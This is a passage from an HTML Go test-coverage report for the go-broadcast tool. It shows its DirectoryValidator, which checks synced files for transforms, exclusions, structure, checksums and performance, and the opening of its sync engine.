                // Validate transform was applied correctly
                <span class="cov8" title="1">if err := dv.validateTransformResult(originalContent, transformedContent, transform, originalPath); err != nil </span><span class="cov8" title="1">{
                        result.Errors = append(result.Errors, fmt.Sprintf("transform validation failed for %s: %v", originalPath, err))
                        result.Summary.TransformErrors++
                }</span>
        }

        // Check for extra files that shouldn't exist
        <span class="cov8" title="1">for transformedPath := range transformedFiles </span><span class="cov8" title="1">{
                if _, exists := originalFiles[transformedPath]; !exists </span><span class="cov8" title="1">{
                        result.Errors = append(result.Errors, fmt.Sprintf("unexpected transformed file: %s", transformedPath))
                        result.Summary.ExtraFiles++
                }</span>
        }

        <span class="cov8" title="1">result.Summary.Duration = time.Since(startTime)
        result.Summary.InvalidFiles = result.Summary.MissingFiles + result.Summary.ExtraFiles + result.Summary.TransformErrors
        result.Summary.ValidFiles = result.Summary.TotalFiles - result.Summary.InvalidFiles

        if len(result.Errors) &gt; 0 </span><span class="cov8" title="1">{
                result.Valid = false
        }</span>

        <span class="cov8" title="1">logger.WithFields(logrus.Fields{
                "valid":            result.Valid,
                "transform_errors": result.Summary.TransformErrors,
                "missing_files":    result.Summary.MissingFiles,
                "extra_files":      result.Summary.ExtraFiles,
                "duration_ms":      result.Summary.Duration.Milliseconds(),
        }).Info("Transform application validation completed")

        return result, nil</span>
}

// ValidateExclusionCompliance ensures excluded files were properly filtered out
func (dv *DirectoryValidator) ValidateExclusionCompliance(ctx context.Context, sourceDir, destDir string, dirMapping config.DirectoryMapping, _ ValidationOptions) (*ValidationResult, error) <span class="cov8" title="1">{
        startTime := time.Now()

        logger := dv.logger.WithFields(logrus.Fields{
                "source_dir":      sourceDir,
                "dest_dir":        destDir,
                "exclusion_count": len(dirMapping.Exclude),
                "operation":       "validate_exclusion_compliance",
        })

        logger.Info("Starting exclusion compliance validation")

        result := &amp;ValidationResult{
                Valid:   true,
                Errors:  []string{},
                Summary: ValidationSummary{},
        }

        // Set up exclusion engine
        dv.exclusionEngine = NewExclusionEngineWithIncludes(dirMapping.Exclude, dirMapping.IncludeOnly)

        // Walk destination directory and check for excluded files
        err := filepath.WalkDir(destDir, func(path string, _ fs.DirEntry, err error) error </span><span class="cov8" title="1">{
                if err != nil </span><span class="cov8" title="1">{
                        return err
                }</span>

                // Handle context cancellation
                <span class="cov8" title="1">select </span>{
                case &lt;-ctx.Done():<span class="cov8" title="1">
                        return ctx.Err()</span>
                default:<span class="cov8" title="1"></span>
                }

                // Calculate relative path
                <span class="cov8" title="1">relPath, err := filepath.Rel(destDir, path)
                if err != nil </span><span class="cov0" title="0">{
                        return err
                }</span>

                <span class="cov8" title="1">if relPath == "." </span><span class="cov8" title="1">{
                        return nil
                }</span>

                <span class="cov8" title="1">result.Summary.TotalFiles++

                // Check if this file should have been excluded
                if dv.exclusionEngine.IsExcluded(relPath) </span><span class="cov8" title="1">{
                        result.Errors = append(result.Errors, fmt.Sprintf("excluded file found in destination: %s", relPath))
                        result.Summary.ExclusionErrors++
                }</span>

                <span class="cov8" title="1">return nil</span>
        })
        <span class="cov8" title="1">if err != nil </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("failed to walk destination directory: %w", err)
        }</span>

        <span class="cov8" title="1">result.Summary.Duration = time.Since(startTime)
        result.Summary.InvalidFiles = result.Summary.ExclusionErrors
        result.Summary.ValidFiles = result.Summary.TotalFiles - result.Summary.InvalidFiles

        if len(result.Errors) &gt; 0 </span><span class="cov8" title="1">{
                result.Valid = false
        }</span>

        <span class="cov8" title="1">logger.WithFields(logrus.Fields{
                "valid":            result.Valid,
                "exclusion_errors": result.Summary.ExclusionErrors,
                "total_files":      result.Summary.TotalFiles,
                "duration_ms":      result.Summary.Duration.Milliseconds(),
        }).Info("Exclusion compliance validation completed")

        return result, nil</span>
}

// ValidateDirectoryStructure verifies that directory structure was preserved correctly
func (dv *DirectoryValidator) ValidateDirectoryStructure(ctx context.Context, sourceDir, destDir string, dirMapping config.DirectoryMapping, opts ValidationOptions) (*ValidationResult, error) <span class="cov8" title="1">{
        startTime := time.Now()

        logger := dv.logger.WithFields(logrus.Fields{
                "source_dir":         sourceDir,
                "dest_dir":           destDir,
                "preserve_structure": dirMapping.PreserveStructure,
                "operation":          "validate_directory_structure",
        })

        logger.Info("Starting directory structure validation")

        result := &amp;ValidationResult{
                Valid:   true,
                Errors:  []string{},
                Summary: ValidationSummary{},
        }

        // Set up exclusion engine for this directory mapping
        dv.exclusionEngine = NewExclusionEngineWithIncludes(dirMapping.Exclude, dirMapping.IncludeOnly)

        // Determine if structure should be preserved
        preserveStructure := true
        if dirMapping.PreserveStructure != nil </span><span class="cov8" title="1">{
                preserveStructure = *dirMapping.PreserveStructure
        }</span>

        // Discover source files
        <span class="cov8" title="1">sourceFiles, err := dv.discoverFiles(ctx, sourceDir, dirMapping, opts)
        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to discover source files: %w", err)
        }</span>

        // Discover destination files
        <span class="cov8" title="1">destFiles, err := dv.discoverFiles(ctx, destDir, dirMapping, opts)
        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to discover destination files: %w", err)
        }</span>

        <span class="cov8" title="1">result.Summary.TotalFiles = len(sourceFiles)

        // Validate structure preservation
        dv.validateDirectoryStructure(sourceFiles, destFiles, dirMapping, result, logger)

        // If structure should be flattened, validate that
        if !preserveStructure </span><span class="cov8" title="1">{
                dv.validateFlattenedStructure(sourceFiles, destFiles, result, logger)
        }</span>

        <span class="cov8" title="1">result.Summary.Duration = time.Since(startTime)
        result.Summary.InvalidFiles = result.Summary.StructureErrors
        result.Summary.ValidFiles = result.Summary.TotalFiles - result.Summary.InvalidFiles

        if len(result.Errors) &gt; 0 </span><span class="cov8" title="1">{
                result.Valid = false
        }</span>

        <span class="cov8" title="1">logger.WithFields(logrus.Fields{
                "valid":            result.Valid,
                "structure_errors": result.Summary.StructureErrors,
                "total_files":      result.Summary.TotalFiles,
                "duration_ms":      result.Summary.Duration.Milliseconds(),
        }).Info("Directory structure validation completed")

        return result, nil</span>
}

// ValidateFileIntegrity checks file content matches and wasn't corrupted during sync
func (dv *DirectoryValidator) ValidateFileIntegrity(_ context.Context, sourceFiles, destFiles map[string]string, opts ValidationOptions) (*ValidationResult, error) <span class="cov8" title="1">{
        startTime := time.Now()

        logger := dv.logger.WithFields(logrus.Fields{
                "source_count": len(sourceFiles),
                "dest_count":   len(destFiles),
                "operation":    "validate_file_integrity",
        })

        logger.Info("Starting file integrity validation")

        result := &amp;ValidationResult{
                Valid:  true,
                Errors: []string{},
                Summary: ValidationSummary{
                        TotalFiles: len(sourceFiles),
                },
        }

        // Set up worker pool for concurrent validation
        maxConcurrency := opts.MaxConcurrency
        if maxConcurrency &lt;= 0 </span><span class="cov8" title="1">{
                maxConcurrency = runtime.NumCPU()
        }</span>

        // Create job channel and results channel
        <span class="cov8" title="1">jobs := make(chan integrityJob, len(sourceFiles))
        results := make(chan FileValidationError, len(sourceFiles))

        // Start workers
        var wg sync.WaitGroup
        for i := 0; i &lt; maxConcurrency; i++ </span><span class="cov8" title="1">{
                wg.Add(1)
                go func() </span><span class="cov8" title="1">{
                        defer wg.Done()
                        for job := range jobs </span><span class="cov8" title="1">{
                                dv.validateFileIntegrityJob(job, results)
                        }</span>
                }()
        }

        // Submit jobs
        <span class="cov8" title="1">go func() </span><span class="cov8" title="1">{
                defer close(jobs)
                for sourcePath, sourceContent := range sourceFiles </span><span class="cov8" title="1">{
                        destContent, exists := destFiles[sourcePath]
                        jobs &lt;- integrityJob{
                                sourcePath:    sourcePath,
                                sourceContent: sourceContent,
                                destContent:   destContent,
                                exists:        exists,
                        }
                }</span>
        }()

        // Collect results
        <span class="cov8" title="1">go func() </span><span class="cov8" title="1">{
                wg.Wait()
                close(results)
        }</span>()

        // Process results
        <span class="cov8" title="1">for validationError := range results </span><span class="cov8" title="1">{
                result.Errors = append(result.Errors, fmt.Sprintf("%s: %s", validationError.ErrorType, validationError.Details))
                switch validationError.ErrorType </span>{
                case "missing_file":<span class="cov8" title="1">
                        result.Summary.MissingFiles++</span>
                case "content_mismatch":<span class="cov8" title="1">
                        result.Summary.ContentMismatches++</span>
                }
        }

        <span class="cov8" title="1">result.Summary.Duration = time.Since(startTime)
        result.Summary.InvalidFiles = result.Summary.MissingFiles + result.Summary.ContentMismatches
        result.Summary.ValidFiles = result.Summary.TotalFiles - result.Summary.InvalidFiles

        if len(result.Errors) &gt; 0 </span><span class="cov8" title="1">{
                result.Valid = false
        }</span>

        <span class="cov8" title="1">logger.WithFields(logrus.Fields{
                "valid":              result.Valid,
                "missing_files":      result.Summary.MissingFiles,
                "content_mismatches": result.Summary.ContentMismatches,
                "duration_ms":        result.Summary.Duration.Milliseconds(),
        }).Info("File integrity validation completed")

        return result, nil</span>
}

// ValidateValidationPerformanceMetrics verifies sync performance meets expected targets
func (dv *DirectoryValidator) ValidateValidationPerformanceMetrics(_ context.Context, metrics ValidationPerformanceMetrics, opts ValidationOptions) (*PerformanceValidationResult, error) <span class="cov8" title="1">{
        logger := dv.logger.WithField("operation", "validate_performance_metrics")

        logger.Info("Starting performance metrics validation")

        // Use provided thresholds or defaults
        thresholds := dv.performanceThresholds
        if opts.PerformanceThresholds != nil </span><span class="cov8" title="1">{
                thresholds = *opts.PerformanceThresholds
        }</span>

        <span class="cov8" title="1">result := &amp;PerformanceValidationResult{
                Valid:           true,
                Metrics:         metrics,
                Thresholds:      thresholds,
                Recommendations: []string{},
        }

        // Validate API call efficiency
        result.APICallsOptimized = metrics.APICalls &lt;= thresholds.MaxAPICalls
        if !result.APICallsOptimized </span><span class="cov8" title="1">{
                result.Valid = false
                result.Recommendations = append(result.Recommendations,
                        fmt.Sprintf("Consider optimizing API calls. Used %d, limit is %d", metrics.APICalls, thresholds.MaxAPICalls))
        }</span>

        // Validate cache hit rate
        <span class="cov8" title="1">result.CacheHitRateGood = metrics.CacheHitRate &gt;= thresholds.MinCacheHitRate
        if !result.CacheHitRateGood </span><span class="cov8" title="1">{
                result.Valid = false
                result.Recommendations = append(result.Recommendations,
                        fmt.Sprintf("Cache hit rate %.2f%% is below threshold %.2f%%", metrics.CacheHitRate*100, thresholds.MinCacheHitRate*100))
        }</span>

        // Validate memory usage
        <span class="cov8" title="1">memoryMB := metrics.MemoryUsage / (1024 * 1024)
        result.MemoryUsageAcceptable = memoryMB &lt;= thresholds.MaxMemoryMB
        if !result.MemoryUsageAcceptable </span><span class="cov8" title="1">{
                result.Valid = false
                result.Recommendations = append(result.Recommendations,
                        fmt.Sprintf("Memory usage %dMB exceeds limit %dMB", memoryMB, thresholds.MaxMemoryMB))
        }</span>

        // Validate processing time
        <span class="cov8" title="1">result.ProcessingTimeGood = metrics.ProcessingTime &lt;= thresholds.MaxProcessingTime
        if !result.ProcessingTimeGood </span><span class="cov8" title="1">{
                result.Valid = false
                result.Recommendations = append(result.Recommendations,
                        fmt.Sprintf("Processing time %v exceeds limit %v", metrics.ProcessingTime, thresholds.MaxProcessingTime))
        }</span>

        // Validate throughput
        <span class="cov8" title="1">throughputGood := metrics.ThroughputMBps &gt;= thresholds.MinThroughputMBps
        if !throughputGood </span><span class="cov8" title="1">{
                result.Valid = false
                result.Recommendations = append(result.Recommendations,
                        fmt.Sprintf("Throughput %.2f MB/s is below minimum %.2f MB/s", metrics.ThroughputMBps, thresholds.MinThroughputMBps))
        }</span>

        <span class="cov8" title="1">logger.WithFields(logrus.Fields{
                "valid":           result.Valid,
                "api_calls":       metrics.APICalls,
                "cache_hit_rate":  metrics.CacheHitRate,
                "memory_mb":       memoryMB,
                "processing_time": metrics.ProcessingTime,
                "throughput_mbps": metrics.ThroughputMBps,
                "recommendations": len(result.Recommendations),
        }).Info("Performance metrics validation completed")

        return result, nil</span>
}

// ValidateAPIEfficiency checks that API call optimization targets were met
func (dv *DirectoryValidator) ValidateAPIEfficiency(_ context.Context, apiCalls, expectedMaxCalls int) (*ValidationResult, error) <span class="cov8" title="1">{
        result := &amp;ValidationResult{
                Valid:   apiCalls &lt;= expectedMaxCalls,
                Errors:  []string{},
                Summary: ValidationSummary{},
        }

        if !result.Valid </span><span class="cov8" title="1">{
                result.Errors = append(result.Errors,
                        fmt.Sprintf("API call limit exceeded: %d calls made, maximum allowed: %d", apiCalls, expectedMaxCalls))
        }</span>

        <span class="cov8" title="1">dv.logger.WithFields(logrus.Fields{
                "api_calls": apiCalls,
                "max_calls": expectedMaxCalls,
                "efficient": result.Valid,
        }).Info("API efficiency validation completed")

        return result, nil</span>
}

// ValidateCacheUtilization verifies cache hit rates meet expectations
func (dv *DirectoryValidator) ValidateCacheUtilization(_ context.Context, cacheHits, cacheMisses int, expectedHitRate float64) (*ValidationResult, error) <span class="cov8" title="1">{
        totalRequests := cacheHits + cacheMisses
        actualHitRate := 0.0
        if totalRequests &gt; 0 </span><span class="cov8" title="1">{
                actualHitRate = float64(cacheHits) / float64(totalRequests)
        }</span>

        <span class="cov8" title="1">result := &amp;ValidationResult{
                Valid:   actualHitRate &gt;= expectedHitRate,
                Errors:  []string{},
                Summary: ValidationSummary{},
        }

        if !result.Valid </span><span class="cov8" title="1">{
                result.Errors = append(result.Errors,
                        fmt.Sprintf("Cache hit rate %.2f%% is below expected %.2f%%", actualHitRate*100, expectedHitRate*100))
        }</span>

        <span class="cov8" title="1">dv.logger.WithFields(logrus.Fields{
                "cache_hits":        cacheHits,
                "cache_misses":      cacheMisses,
                "hit_rate":          actualHitRate,
                "expected_hit_rate": expectedHitRate,
                "efficient":         result.Valid,
        }).Info("Cache utilization validation completed")

        return result, nil</span>
}

// ValidateMemoryUsage ensures memory usage stays within expected bounds
func (dv *DirectoryValidator) ValidateMemoryUsage(_ context.Context, memoryUsage, maxMemoryBytes int64) (*ValidationResult, error) <span class="cov8" title="1">{
        result := &amp;ValidationResult{
                Valid:  memoryUsage &lt;= maxMemoryBytes,
                Errors: []string{},
                Summary: ValidationSummary{
                        BytesValidated: memoryUsage,
                },
        }

        if !result.Valid </span><span class="cov8" title="1">{
                result.Errors = append(result.Errors,
                        fmt.Sprintf("Memory usage %d bytes exceeds limit %d bytes", memoryUsage, maxMemoryBytes))
        }</span>

        <span class="cov8" title="1">dv.logger.WithFields(logrus.Fields{
                "memory_usage":  memoryUsage,
                "memory_limit":  maxMemoryBytes,
                "within_bounds": result.Valid,
        }).Info("Memory usage validation completed")

        return result, nil</span>
}

// ValidateProgressReporting verifies progress reporting worked correctly
func (dv *DirectoryValidator) ValidateProgressReporting(_ context.Context, expectedFiles, reportedFiles int, progressUpdates []string) (*ValidationResult, error) <span class="cov8" title="1">{
        result := &amp;ValidationResult{
                Valid:  expectedFiles == reportedFiles,
                Errors: []string{},
                Summary: ValidationSummary{
                        TotalFiles: expectedFiles,
                },
        }

        if expectedFiles != reportedFiles </span><span class="cov8" title="1">{
                result.Errors = append(result.Errors,
                        fmt.Sprintf("Progress reporting mismatch: expected %d files, reported %d files", expectedFiles, reportedFiles))
        }</span>

        // Validate that progress updates were generated
        <span class="cov8" title="1">if len(progressUpdates) == 0 &amp;&amp; expectedFiles &gt; 0 </span><span class="cov8" title="1">{
                result.Valid = false
                result.Errors = append(result.Errors, "No progress updates were generated")
        }</span>

        <span class="cov8" title="1">dv.logger.WithFields(logrus.Fields{
                "expected_files":   expectedFiles,
                "reported_files":   reportedFiles,
                "progress_updates": len(progressUpdates),
                "accurate":         result.Valid,
        }).Info("Progress reporting validation completed")

        return result, nil</span>
}

// Helper methods

// discoverFiles walks a directory and discovers all files, respecting exclusions
func (dv *DirectoryValidator) discoverFiles(ctx context.Context, dir string, dirMapping config.DirectoryMapping, opts ValidationOptions) (map[string]DiscoveredFile, error) <span class="cov8" title="1">{
        files := make(map[string]DiscoveredFile)
        var mu sync.Mutex

        // Determine if hidden files should be included
        includeHidden := true
        if dirMapping.IncludeHidden != nil </span><span class="cov8" title="1">{
                includeHidden = *dirMapping.IncludeHidden
        }</span>
        <span class="cov8" title="1">if opts.IgnoreHiddenFiles </span><span class="cov0" title="0">{
                includeHidden = false
        }</span>

        <span class="cov8" title="1">err := filepath.WalkDir(dir, func(path string, d fs.DirEntry, err error) error </span><span class="cov8" title="1">{
                if err != nil </span><span class="cov0" title="0">{
                        return err
                }</span>

                // Handle context cancellation
                <span class="cov8" title="1">select </span>{
                case &lt;-ctx.Done():<span class="cov8" title="1">
                        return ctx.Err()</span>
                default:<span class="cov8" title="1"></span>
                }

                // Calculate relative path
                <span class="cov8" title="1">relPath, err := filepath.Rel(dir, path)
                if err != nil </span><span class="cov0" title="0">{
                        return err
                }</span>

                <span class="cov8" title="1">if relPath == "." || d.IsDir() </span><span class="cov8" title="1">{
                        return nil
                }</span>

                // Check for hidden files
                <span class="cov8" title="1">if !includeHidden &amp;&amp; dv.isHidden(relPath) </span><span class="cov8" title="1">{
                        return nil
                }</span>

                // Check exclusions
                <span class="cov8" title="1">if dv.exclusionEngine != nil &amp;&amp; dv.exclusionEngine.IsExcluded(relPath) </span><span class="cov8" title="1">{
                        return nil
                }</span>

                // Get file info
                <span class="cov8" title="1">info, err := d.Info()
                if err != nil </span><span class="cov0" title="0">{
                        return err
                }</span>

                <span class="cov8" title="1">mu.Lock()
                files[relPath] = DiscoveredFile{
                        RelativePath: relPath,
                        FullPath:     path,
                        Size:         info.Size(),
                        IsDir:        d.IsDir(),
                }
                mu.Unlock()

                return nil</span>
        })

        <span class="cov8" title="1">return files, err</span>
}

// validateDirectoryStructure validates that the directory structure is correct
func (dv *DirectoryValidator) validateDirectoryStructure(sourceFiles, destFiles map[string]DiscoveredFile, dirMapping config.DirectoryMapping, result *ValidationResult, _ *logrus.Entry) <span class="cov8" title="1">{
        preserveStructure := true
        if dirMapping.PreserveStructure != nil </span><span class="cov8" title="1">{
                preserveStructure = *dirMapping.PreserveStructure
        }</span>

        <span class="cov8" title="1">for relPath := range sourceFiles </span><span class="cov8" title="1">{
                expectedDestPath := relPath
                if !preserveStructure </span><span class="cov8" title="1">{
                        expectedDestPath = filepath.Base(relPath)
                }</span>

                <span class="cov8" title="1">if _, exists := destFiles[expectedDestPath]; !exists </span><span class="cov8" title="1">{
                        result.Errors = append(result.Errors, fmt.Sprintf("missing file in destination: %s", expectedDestPath))
                        result.Summary.MissingFiles++
                }</span>
        }

        // Check for extra files in destination
        <span class="cov8" title="1">for destPath := range destFiles </span><span class="cov8" title="1">{
                expectedSourcePath := destPath
                if !preserveStructure </span><span class="cov8" title="1">{
                        // For flattened structure, need to find source file with same base name
                        found := false
                        for sourcePath := range sourceFiles </span><span class="cov8" title="1">{
                                if filepath.Base(sourcePath) == destPath </span><span class="cov8" title="1">{
                                        found = true
                                        break</span>
                                }
                        }
                        <span class="cov8" title="1">if !found </span><span class="cov8" title="1">{
                                result.Errors = append(result.Errors, fmt.Sprintf("unexpected file in destination: %s", destPath))
                                result.Summary.ExtraFiles++
                        }</span>
                } else<span class="cov8" title="1"> {
                        if _, exists := sourceFiles[expectedSourcePath]; !exists </span><span class="cov8" title="1">{
                                result.Errors = append(result.Errors, fmt.Sprintf("unexpected file in destination: %s", destPath))
                                result.Summary.ExtraFiles++
                        }</span>
                }
        }
}

// validateFlattenedStructure validates that directory structure was correctly flattened
func (dv *DirectoryValidator) validateFlattenedStructure(_, destFiles map[string]DiscoveredFile, result *ValidationResult, _ *logrus.Entry) <span class="cov8" title="1">{
        // In flattened structure, all files should be at root level
        for destPath := range destFiles </span><span class="cov8" title="1">{
                if strings.Contains(destPath, string(filepath.Separator)) </span><span class="cov8" title="1">{
                        result.Errors = append(result.Errors, fmt.Sprintf("nested file found in flattened destination: %s", destPath))
                        result.Summary.StructureErrors++
                }</span>
        }
}

// validateFileContent validates that file contents match between source and destination
func (dv *DirectoryValidator) validateFileContent(_ context.Context, _, _ string, sourceFiles, destFiles map[string]DiscoveredFile, _ config.DirectoryMapping, result *ValidationResult, _ ValidationOptions, logger *logrus.Entry) <span class="cov8" title="1">{
        // Implementation depends on whether we're checking raw content or transformed content
        // For now, we'll do a basic size comparison and checksum validation

        for relPath, sourceFile := range sourceFiles </span><span class="cov8" title="1">{
                destFile, exists := destFiles[relPath]
                if !exists </span><span class="cov8" title="1">{
                        continue</span> // Already handled in structure validation
                }

                // Compare file sizes first (quick check)
                <span class="cov8" title="1">if sourceFile.Size != destFile.Size </span><span class="cov8" title="1">{
                        result.Errors = append(result.Errors, fmt.Sprintf("file size mismatch for %s: source=%d, dest=%d", relPath, sourceFile.Size, destFile.Size))
                        result.Summary.ContentMismatches++
                        continue</span>
                }

                // Compare file checksums
                <span class="cov8" title="1">sourceChecksum, err := dv.calculateFileChecksum(sourceFile.FullPath)
                if err != nil </span><span class="cov0" title="0">{
                        logger.WithError(err).WithField("file", relPath).Warn("Failed to calculate source checksum")
                        continue</span>
                }

                <span class="cov8" title="1">destChecksum, err := dv.calculateFileChecksum(destFile.FullPath)
                if err != nil </span><span class="cov0" title="0">{
                        logger.WithError(err).WithField("file", relPath).Warn("Failed to calculate destination checksum")
                        continue</span>
                }

                <span class="cov8" title="1">if sourceChecksum != destChecksum </span><span class="cov0" title="0">{
                        result.Errors = append(result.Errors, fmt.Sprintf("content checksum mismatch for %s", relPath))
                        result.Summary.ContentMismatches++
                }</span>

                <span class="cov8" title="1">result.Summary.BytesValidated += sourceFile.Size</span>
        }
}

// validateExclusions validates that exclusion patterns were applied correctly
func (dv *DirectoryValidator) validateExclusions(_, destFiles map[string]DiscoveredFile, _ config.DirectoryMapping, result *ValidationResult, _ *logrus.Entry) <span class="cov8" title="1">{
        // Check that no excluded files made it to destination
        for destPath := range destFiles </span><span class="cov8" title="1">{
                if dv.exclusionEngine.IsExcluded(destPath) </span><span class="cov0" title="0">{
                        result.Errors = append(result.Errors, fmt.Sprintf("excluded file found in destination: %s", destPath))
                        result.Summary.ExclusionErrors++
                }</span>
        }
}

// validateTransformResult validates that a transform was applied correctly
func (dv *DirectoryValidator) validateTransformResult(original, transformed string, transform config.Transform, _ string) error <span class="cov8" title="1">{
        // Basic validation - check that if repo_name transform is enabled, repository names were replaced
        if transform.RepoName </span><span class="cov8" title="1">{
                // This is a simplified check - in practice, you'd need access to the actual repo names
                if original == transformed </span><span class="cov8" title="1">{
                        return fmt.Errorf("repo_name transform enabled but content unchanged: %w", ErrValidationFailed)
                }</span>
        }

        // Check variable substitutions
        <span class="cov8" title="1">for variable := range transform.Variables </span><span class="cov8" title="1">{
                placeholder := fmt.Sprintf("{{%s}}", variable)
                if strings.Contains(original, placeholder) &amp;&amp; strings.Contains(transformed, placeholder) </span><span class="cov8" title="1">{
                        return fmt.Errorf("variable %s not substituted: %w", variable, ErrTransformValidationFailed)
                }</span>
        }

        // Validate UTF-8 encoding
        <span class="cov8" title="1">if !utf8.ValidString(transformed) </span><span class="cov8" title="1">{
                return fmt.Errorf("transformed content contains invalid UTF-8: %w", ErrEncodingValidationFailed)
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// validateFileIntegrityJob validates the integrity of a single file
func (dv *DirectoryValidator) validateFileIntegrityJob(job integrityJob, results chan&lt;- FileValidationError) <span class="cov8" title="1">{
        if !job.exists </span><span class="cov8" title="1">{
                results &lt;- FileValidationError{
                        FilePath:  job.sourcePath,
                        ErrorType: "missing_file",
                        Details:   "File exists in source but not in destination",
                }
                return
        }</span>

        // Compare content checksums
        <span class="cov8" title="1">sourceHash := fmt.Sprintf("%x", sha256.Sum256([]byte(job.sourceContent)))
        destHash := fmt.Sprintf("%x", sha256.Sum256([]byte(job.destContent)))

        if sourceHash != destHash </span><span class="cov8" title="1">{
                results &lt;- FileValidationError{
                        FilePath:  job.sourcePath,
                        ErrorType: "content_mismatch",
                        Expected:  sourceHash,
                        Actual:    destHash,
                        Details:   "File content checksums do not match",
                }
        }</span>
}

// calculateFileChecksum calculates MD5 checksum of a file
func (dv *DirectoryValidator) calculateFileChecksum(filePath string) (string, error) <span class="cov8" title="1">{
        // Clean the file path to prevent directory traversal
        cleanPath := filepath.Clean(filePath)
        file, err := os.Open(cleanPath)
        if err != nil </span><span class="cov8" title="1">{
                return "", err
        }</span>
        <span class="cov8" title="1">defer func() </span><span class="cov8" title="1">{
                if closeErr := file.Close(); closeErr != nil </span><span class="cov0" title="0">{
                        dv.logger.WithError(closeErr).Warn("Failed to close file")
                }</span>
        }()

        <span class="cov8" title="1">hash := sha256.New()
        if _, err := io.Copy(hash, file); err != nil </span><span class="cov0" title="0">{
                return "", err
        }</span>

        <span class="cov8" title="1">return fmt.Sprintf("%x", hash.Sum(nil)), nil</span>
}

// isHidden checks if a file path represents a hidden file
func (dv *DirectoryValidator) isHidden(path string) bool <span class="cov8" title="1">{
        parts := strings.Split(filepath.ToSlash(path), "/")
        for _, part := range parts </span><span class="cov8" title="1">{
                if strings.HasPrefix(part, ".") &amp;&amp; part != "." &amp;&amp; part != ".." </span><span class="cov8" title="1">{
                        return true
                }</span>
        }
        <span class="cov8" title="1">return false</span>
}

// DefaultValidationOptions returns default validation options
func DefaultValidationOptions() ValidationOptions <span class="cov8" title="1">{
        return ValidationOptions{
                CheckContent:           true,
                CheckStructure:         true,
                CheckExclusions:        true,
                CheckTransforms:        true,
                CheckPerformance:       false,
                CheckIntegrity:         true,
                IgnoreHiddenFiles:      false,
                MaxConcurrency:         runtime.NumCPU(),
                DetailedErrorReporting: true,
        }
}</span>

// ValidateAllAspects performs comprehensive validation of directory sync results
func (dv *DirectoryValidator) ValidateAllAspects(ctx context.Context, sourceDir, destDir string, dirMapping config.DirectoryMapping, opts ValidationOptions) (*ValidationResult, error) <span class="cov8" title="1">{
        logger := dv.logger.WithField("operation", "validate_all_aspects")
        logger.Info("Starting comprehensive directory sync validation")

        // Run all validations and combine results
        syncResult, err := dv.ValidateSyncResults(ctx, sourceDir, destDir, dirMapping, opts)
        if err != nil </span><span class="cov8" title="1">{
                return nil, fmt.Errorf("sync results validation failed: %w", err)
        }</span>

        <span class="cov8" title="1">structureResult, err := dv.ValidateDirectoryStructure(ctx, sourceDir, destDir, dirMapping, opts)
        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("directory structure validation failed: %w", err)
        }</span>

        <span class="cov8" title="1">exclusionResult, err := dv.ValidateExclusionCompliance(ctx, sourceDir, destDir, dirMapping, opts)
        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("exclusion compliance validation failed: %w", err)
        }</span>

        // Combine all results
        <span class="cov8" title="1">combinedResult := &amp;ValidationResult{
                Valid:  syncResult.Valid &amp;&amp; structureResult.Valid &amp;&amp; exclusionResult.Valid,
                Errors: append(append(syncResult.Errors, structureResult.Errors...), exclusionResult.Errors...),
                Summary: ValidationSummary{
                        TotalFiles:        syncResult.Summary.TotalFiles,
                        ValidFiles:        syncResult.Summary.ValidFiles,
                        InvalidFiles:      syncResult.Summary.InvalidFiles + structureResult.Summary.InvalidFiles + exclusionResult.Summary.InvalidFiles,
                        MissingFiles:      syncResult.Summary.MissingFiles,
                        ExtraFiles:        syncResult.Summary.ExtraFiles,
                        ContentMismatches: syncResult.Summary.ContentMismatches,
                        TransformErrors:   syncResult.Summary.TransformErrors,
                        StructureErrors:   structureResult.Summary.StructureErrors,
                        ExclusionErrors:   exclusionResult.Summary.ExclusionErrors,
                        Duration:          syncResult.Summary.Duration + structureResult.Summary.Duration + exclusionResult.Summary.Duration,
                        BytesValidated:    syncResult.Summary.BytesValidated,
                },
        }

        logger.WithFields(logrus.Fields{
                "overall_valid": combinedResult.Valid,
                "total_errors":  len(combinedResult.Errors),
                "total_files":   combinedResult.Summary.TotalFiles,
                "invalid_files": combinedResult.Summary.InvalidFiles,
                "duration_ms":   combinedResult.Summary.Duration.Milliseconds(),
        }).Info("Comprehensive directory sync validation completed")

        return combinedResult, nil</span>
}
</pre>

		<pre class="file" id="file61" style="display: none">// Package sync provides the core synchronization engine
package sync

import (
        "context"
        "fmt"

        "github.com/sirupsen/logrus"
        "golang.org/x/sync/errgroup"

        "github.com/mrz1836/go-broadcast/internal/config"
        appErrors "github.com/mrz1836/go-broadcast/internal/errors"
        "github.com/mrz1836/go-broadcast/internal/gh"
        "github.com/mrz1836/go-broadcast/internal/git"
        "github.com/mrz1836/go-broadcast/internal/state"
        "github.com/mrz1836/go-broadcast/internal/transform"
)

// Engine orchestrates the complete synchronization process
type Engine struct {
        config       *config.Config
        currentGroup *config.Group // Current group being processed
        gh           gh.Client
        git          git.Client
        state        state.Discoverer
        transform    transform.Chain
        options      *Options
        logger       *logrus.Logger
}

// NewEngine creates a new sync engine with the provided dependencies
func NewEngine(
        cfg *config.Config,
        ghClient gh.Client,
        gitClient git.Client,
        stateDiscoverer state.Discoverer,
        transformChain transform.Chain,
        opts *Options,
) *Engine <span class="cov8" title="1">{
        if opts == nil </span><span class="cov8" title="1">{
                opts = DefaultOptions()
        }</span>

        <span class="cov8" title="1">return &amp;Engine{
                config:    cfg,
                gh:        ghClient,
                git:       gitClient,
                state:     stateDiscoverer,
                transform: transformChain,
                options:   opts,
                logger:    logrus.StandardLogger(),
        }</span>
}

// SetLogger sets a custom logger for the engine
func (e *Engine) SetLogger(logger *logrus.Logger) <span class="cov8" title="1">{
        e.logger = logger
}</span>

// Sync orchestrates the complete synchronization process
func (e *Engine) Sync(ctx context.Context, targetFilter []string) error <span class="cov8" title="1">{
        log := e.logger.WithField("component", "sync_engine")

        log.Info("Starting sync operation")
        if e.options.DryRun </span><span class="cov8" title="1">{
                log.Warn("DRY-RUN MODE: No changes will be made")
        }</span>

        // Get groups using compatibility layer
        <span class="cov8" title="1">groups := e.config.Groups
        if len(groups) == 0 </span><span class="cov0" title="0">{
                log.Info("No groups found in configuration")
                return nil
        }</span>

